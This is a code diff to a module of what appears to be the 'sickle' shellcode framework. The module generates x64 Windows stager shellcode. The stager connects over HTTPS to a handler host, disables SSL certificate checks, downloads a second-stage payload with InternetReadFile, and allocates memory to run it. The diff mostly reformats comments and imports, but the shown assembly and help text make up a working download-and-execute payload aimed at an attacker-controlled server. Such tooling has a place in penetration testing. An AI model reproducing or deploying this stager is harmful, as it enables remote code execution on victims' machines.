@@ -1,8 +1,6 @@
 import sys
-import ctypes
 import struct
 
-from sickle.common.lib.generic import extract
 from sickle.common.lib.generic import convert
 from sickle.common.lib.generic import modparser
 from sickle.common.lib.programmer import builder
@@ -12,8 +10,6 @@ from sickle.common.lib.reversing.assembler import Assembler
 
 from sickle.common.headers.windows import (
     winnt,
-    ws2def,
-    winternl
 )
 
 class Shellcode():
@@ -50,7 +46,7 @@ class Shellcode():
                    "HANDLER=https SRVHOST=192.168.50.210 SRVPORT=443\n\n"
 
                    "Upon execution of the first stage, you should get a connection from the target on your handler"
-                   "and the second stage should begin executing on the target machine")
+                   " and the second stage should begin executing on the target machine")
 
     arguments = {}
     arguments["LHOST"] = {}
@@ -158,7 +154,7 @@ class Shellcode():
         self.dwSSLFlags = (0x00800000 | 0x00001000)
         self.dwFlags = (0x00000100 | 0x10000000 | 0x00000200)
 
-        # Set the http path
+        # Set the HTTP path
         if "PATH" not in argv_dict.keys():
             self.path = "/corn"
         else:
@@ -198,11 +194,11 @@ class Shellcode():
     lea rcx, [rbp - {self.storage_offsets['caUserAgent']}]\n"""
 
         src += f"""
-    ; HINTERNET InternetOpenA([in] LPCSTR lpszAgent,        // RCX
-    ;                         [in] DWORD  dwAccessType,     // RDX
-    ;                         [in] LPCSTR lpszProxy,        // R8
-    ;                         [in] LPCSTR lpszProxyBypass,  // R9
-    ;                         [in] DWORD  dwFlags);         // RSP+0x20
+; HINTERNET InternetOpenA([in] LPCSTR lpszAgent,
+;                         [in] DWORD  dwAccessType,
+;                         [in] LPCSTR lpszProxy,
+;                         [in] LPCSTR lpszProxyBypass,
+;                         [in] DWORD  dwFlags); 
     xor rdx, rdx
     xor r8, r8
     xor r9, r9
@@ -240,14 +236,14 @@ class Shellcode():
     lea rdx, [rbp - {self.storage_offsets['caHost']}]\n"""
 
         src += f"""
-    ; HINTERNET InternetConnectA([in] HINTERNET     hInternet,          // RCX
-    ;                            [in] LPCSTR        lpszServerName,     // RDX
-    ;                            [in] INTERNET_PORT nServerPort,        // R8
-    ;                            [in] LPCSTR        lpszUserName,       // R9
-    ;                            [in] LPCSTR        lpszPassword,       // RSP + 0x20 
-    ;                            [in] DWORD         dwService,          // RSP + 0x28
-    ;                            [in] DWORD         dwFlags,            // RSP + 0x30
-    ;                            [in] DWORD_PTR     dwContext);         // RSP + 0x38
+; HINTERNET InternetConnectA([in] HINTERNET     hInternet,
+;                            [in] LPCSTR        lpszServerName,
+;                            [in] INTERNET_PORT nServerPort,
+;                            [in] LPCSTR        lpszUserName,
+;                            [in] LPCSTR        lpszPassword,
+;                            [in] DWORD         dwService,
+;                            [in] DWORD         dwFlags,
+;                            [in] DWORD_PTR     dwContext);
     mov rcx, [rbp - {self.storage_offsets['hInternet']}]
     mov r8, {hex(self.lport)}
     xor r9, r9
@@ -289,14 +285,14 @@ class Shellcode():
     lea r8, [rbp - {self.storage_offsets['caPath']}]\n"""
 
         src += f"""
-    ; HINTERNET HttpOpenRequestA([in] HINTERNET hConnect,               // RCX
-    ;                            [in] LPCSTR    lpszVerb,               // RDX
-    ;                            [in] LPCSTR    lpszObjectName,         // R8
-    ;                            [in] LPCSTR    lpszVersion,            // R9
-    ;                            [in] LPCSTR    lpszReferrer,           // RSP + 0x20
-    ;                            [in] LPCSTR    *lplpszAcceptTypes,     // RSP + 0x28
-    ;                            [in] DWORD     dwFlags,                // RSP + 0x30
-    ;                            [in] DWORD_PTR dwContext);             // RSP + 0x38
+; HINTERNET HttpOpenRequestA([in] HINTERNET hConnect,
+;                            [in] LPCSTR    lpszVerb,
+;                            [in] LPCSTR    lpszObjectName,
+;                            [in] LPCSTR    lpszVersion,
+;                            [in] LPCSTR    lpszReferrer,
+;                            [in] LPCSTR    *lplpszAcceptTypes,
+;                            [in] DWORD     dwFlags,
+;                            [in] DWORD_PTR dwContext);
     mov rcx, [rbp - {self.storage_offsets['hConnect']}]
     mov r11, {self.request}
     mov [rbp - {self.storage_offsets['caRequest']}], r11
@@ -311,10 +307,10 @@ class Shellcode():
     call rax
     mov [rbp - {self.storage_offsets['hRequest']}], rax
 
-    ; BOOL InternetSetOptionA([in] HINTERNET hInternet,       // RCX (IF SOMETHING GOES WRONG INVESTIGATE THIS CALL)
-    ;                         [in] DWORD     dwOption,        // RDX
-    ;                         [in] LPVOID    lpBuffer,        // R8
-    ;                         [in] DWORD     dwBufferLength); // R9
+; BOOL InternetSetOptionA([in] HINTERNET hInternet,
+;                         [in] DWORD     dwOption,
+;                         [in] LPVOID    lpBuffer,
+;                         [in] DWORD     dwBufferLength);
     mov rcx, [rbp - {self.storage_offsets['hRequest']}]
     mov rdx, 0x1F
     mov r11, {hex(self.dwFlags)}
@@ -324,11 +320,11 @@ class Shellcode():
     mov rax, [rbp - {self.storage_offsets['InternetSetOptionA']}]
     call rax
 
-    ; BOOL HttpSendRequestA([in] HINTERNET hRequest,
-    ;                       [in] LPCSTR    lpszHeaders,
-    ;                       [in] DWORD     dwHeadersLength,
-    ;                       [in] LPVOID    lpOptional,
-    ;                       [in] DWORD     dwOptionalLength);
+; BOOL HttpSendRequestA([in] HINTERNET hRequest,
+;                       [in] LPCSTR    lpszHeaders,
+;                       [in] DWORD     dwHeadersLength,
+;                       [in] LPVOID    lpOptional,
+;                       [in] DWORD     dwOptionalLength);
     mov rcx, [rbp - {self.storage_offsets['hRequest']}]
     xor rdx, rdx
     xor r8, r8
@@ -337,11 +333,10 @@ class Shellcode():
     mov rax, [rbp - {self.storage_offsets['HttpSendRequestA']}]
     call rax
 
-    ; BOOL InternetReadFile([in]  HINTERNET hFile,
-    ;                       [out] LPVOID    lpBuffer,
-    ;                       [in]  DWORD     dwNumberOfBytesToRead,
-    ;                       [out] LPDWORD   lpdwNumberOfBytesRead);
-
+; BOOL InternetReadFile([in]  HINTERNET hFile,
+;                       [out] LPVOID    lpBuffer,
+;                       [in]  DWORD     dwNumberOfBytesToRead,
+;                       [out] LPDWORD   lpdwNumberOfBytesRead);
     lea rdx, [rbp - {self.storage_offsets['dwSize']}]
     mov r8, 0x08
 call_InternetReadFile:
@@ -354,12 +349,10 @@ call_InternetReadFile:
     cmp rax, 0x08
     jg download_complete
 
-    ; LPVOID VirtualAlloc(
-    ;   [in, optional] LPVOID lpAddress,
-    ;   [in]           SIZE_T dwSize,
-    ;   [in]           DWORD  flAllocationType,
-    ;   [in]           DWORD  flProtect
-    ; );
+; LPVOID VirtualAlloc([in, optional] LPVOID lpAddress,
+;                     [in]           SIZE_T dwSize,
+;                     [in]           DWORD  flAllocationType,
+;                     [in]           DWORD  flProtect);
 call_VirtualAlloc:
     mov rcx, [rbp - {self.storage_offsets['lpvShellcode']}]
     mov rdx, [rbp - {self.storage_offsets['dwSize']}]
